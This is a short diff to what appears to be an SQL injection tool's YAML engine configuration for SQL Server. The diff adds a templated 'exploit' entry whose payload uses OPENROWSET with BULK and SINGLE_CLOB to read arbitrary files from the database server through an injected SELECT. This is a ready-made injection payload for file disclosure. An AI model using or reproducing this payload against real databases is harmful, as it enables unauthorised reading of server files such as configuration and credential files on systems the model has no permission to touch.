@@ -107,6 +107,10 @@ resource:
      )
     concat: "%2b '%7f' %2b"
 
+ exploit: |
+  file:
+    read: select '${enclose_value_sql}'%%2bx%%2b'${separator_qte_sql}0${enclose_value_sql}${trail_sql}' from openrowset(bulk '%s', single_clob) r(x)
+
 strategy:
  configuration:
   slidingWindow: |
